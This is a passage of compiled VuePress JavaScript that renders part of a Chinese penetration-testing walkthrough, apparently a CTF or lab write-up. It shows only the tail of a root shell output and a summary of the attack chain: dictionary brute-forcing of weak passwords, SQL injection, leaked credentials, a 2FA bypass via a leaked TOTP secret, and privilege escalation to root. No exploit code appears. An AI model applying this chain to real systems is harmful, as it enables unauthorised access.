operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("root"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("h2",{attrs:{id:"_4-总结"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_4-总结"}},[s._v("#")]),s._v(" 4. 总结")]),s._v(" "),a("h3",{attrs:{id:"技术要点"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#技术要点"}},[s._v("#")]),s._v(" 技术要点")]),s._v(" "),a("ol",[a("li",[a("strong",[s._v("弱密码漏洞")]),s._v(" - 使用常见密码字典成功爆破")]),s._v(" "),a("li",[a("strong",[s._v("SQL 注入")]),s._v(" - 未过滤的用户输入导致数据库信息泄露")]),s._v(" "),a("li",[a("strong",[s._v("信息泄露")]),s._v(" - 数据库中包含敏感路径和凭据")]),s._v(" "),a("li",[a("strong",[s._v("双因子认证绕过")]),s._v(" - TOTP 密钥泄露导致 2FA 被绕过")]),s._v(" "),a("li",[a("strong",[s._v("权限提升")]),s._v(" - 重用凭据和 TOTP 密钥获得 root 访问")])])])}),[],!1,null,null,null);a.default=r.exports}}]);